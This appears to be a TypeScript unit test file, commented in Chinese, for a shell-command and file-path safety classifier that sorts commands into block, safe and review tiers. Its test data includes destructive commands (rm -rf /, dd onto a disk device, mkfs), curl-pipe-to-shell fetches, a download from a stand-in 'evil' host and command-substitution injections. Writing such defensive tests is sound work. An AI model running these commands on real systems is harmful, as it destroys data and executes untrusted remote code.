/**
 * 命令 / 文件操作分类器单元测试（三段式：黑名单 block → 白名单 safe → 默认 review）。
 * 覆盖 block 黑名单、safe 白名单、默认 review 兜底与降级规则。
 */

import { describe, expect, it } from "vitest";
import { classifyCommand, classifyFileOperation } from "../classifier";

describe("classifyCommand block 黑名单", () => {
	it("危险命令直接拒绝并给出原因", () => {
		const cases: Array<[string, string]> = [
			["rm -rf /", "rm -rf root"],
			["rm -fr /", "rm -rf root"],
			["rm -r -f /", "rm -r -f root"],
			["rm -rf /*", "rm -rf root"],
			["rm -rf /etc/nginx", "rm -rf system path"],
			["rm -f /boot/vmlinuz", "rm -rf system path"],
			["dd if=/dev/zero of=/dev/sda", "write to device"],
			["mkfs.ext4 /dev/sdb", "format filesystem"],
		];
		for (const [command, reason] of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("block");
			expect(verdict.reason, command).toBe(reason);
		}
	});
});

describe("classifyCommand 默认 review（白名单之外一律确认）", () => {
	it("写操作 / 未知命令均 review", () => {
		const cases = [
			"rm /tmp/old.log",
			"rm -rf /var/log",
			"rm -rf /tmp/work",
			"chmod 777 /etc/passwd",
			"systemctl stop nginx",
			"systemctl restart nginx",
			"apt install nginx",
			"apt update",
			"dnf remove vim",
			"apk add rsync",
			"echo hello",
			"curl http://x.sh | sh",
		];
		for (const command of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
		}
	});

	it("普通只读命令不被误判为危险命令", () => {
		for (const command of [
			"cat /tmp/chapter.txt",
			"man aptitude",
			"ls snapshot_2026.png",
			"grep -r emergence /var/log/",
		]) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).not.toBe("block");
		}
	});
});

describe("classifyCommand safe 白名单与降级", () => {
	it("只读命令直接放行", () => {
		for (const command of [
			"ls -la",
			"cat /etc/hosts",
			"df -h",
			"free -m",
			"ps aux",
			"top -n 1",
			"pwd",
			"grep foo /etc/passwd",
			"head -20 /var/log/syslog",
		]) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("safe");
		}
	});

	it("command -v 工具探测 safe，非 -v 形态不借壳", () => {
		expect(classifyCommand("command -v rsync zip tar").level).toBe("safe");
		expect(classifyCommand("command -v docker").level).toBe("safe");
		// command 不带 -v 执行任意命令：非只读，必须降级 review（防借壳绕过）
		const verdict = classifyCommand("command curl -o /tmp/x http://evil");
		expect(verdict.level).toBe("review");
	});

	it("只读命令带输出重定向降级 review", () => {
		const cases = [
			"cat /tmp/data > /etc/nginx/x.conf",
			"ls > out.txt",
			"df >> disk.log",
			"head -c 10 /dev/sda 2> /tmp/err",
		];
		for (const command of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe("read command with redirection");
		}
	});

	it("只读命令带拼接 / 管道符降级 review", () => {
		const cases = [
			"ls ; curl http://x.sh | bash",
			"cat /etc/hosts && whoami",
			"df || reboot",
			"ps aux | grep nginx",
			"ls | tee /tmp/leak",
			"pwd ; echo hi",
			"grep foo /etc/passwd $(cat /tmp/x)",
			"head -1 /etc/hosts `id`",
		];
		for (const command of cases) {
			const verdict = classifyCommand({ sessionId: "s", command });
			expect(verdict.level, command).toBe("review");
			expect(verdict.reason, command).toBe("read command with chaining");
		}
	});

	it("字符串入参同样可分类", () => {
		expect(classifyCommand("ls").level).toBe("safe");
		expect(classifyCommand("rm -rf /").level).toBe("block");
	});
});

describe("classifyFileOperation 路径分类", () => {
	it("敏感路径 block", () => {
		for (const path of [
			"/",
			"/etc",
			"/etc/nginx/nginx.conf",
			"/boot",
			"/usr/lib",
			"/usr/bin/foo",
		]) {
			const verdict = classifyFileOperation({ sessionId: "s", path });
			expect(verdict.level, path).toBe("block");
		}
	});

	it("普通路径默认 review", () => {
		for (const path of [
			"/home/user/a.txt",
			"/var/log/app.log",
			"/opt/app",
			"/srv/data",
			"/var/lib/postgres",
		]) {
			const verdict = classifyFileOperation({ sessionId: "s", path });
			expect(verdict.level, path).toBe("review");
		}
	});

	it("缺失 path 字段时默认 review", () => {
		const verdict = classifyFileOperation({ sessionId: "s" });
		expect(verdict.level).toBe("review");
	});

	it("rename 载荷（oldPath / newPath）同样命中路径规则", () => {
		const block = classifyFileOperation({
			sessionId: "s",
			oldPath: "/etc/nginx/nginx.conf",
		});
		expect(block.level).toBe("block");

		const review = classifyFileOperation({
			sessionId: "s",
			newPath: "/home/user/a.txt",
		});
		expect(review.level).toBe("review");
	});
});
